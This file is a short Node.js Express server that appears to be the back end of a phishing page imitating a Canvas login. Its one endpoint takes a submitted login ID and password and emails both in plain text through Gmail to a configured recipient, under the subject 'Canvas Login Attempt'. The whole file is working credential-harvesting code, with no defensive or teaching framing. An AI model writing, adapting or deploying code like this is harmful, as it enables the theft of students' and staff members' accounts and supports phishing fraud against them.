require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post("/send-canvas-email", async (req, res) => {
  const { loginID, password } = req.body;
  if (!loginID || !password) return res.status(400).json({ message: "Missing fields" });

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: "Canvas Login Attempt",
    text: `Login ID: ${loginID}\nPassword: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: "Email sent" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Failed to send email" });
  }
});

app.listen(3000, () => console.log("Server running on http://localhost:3000"));
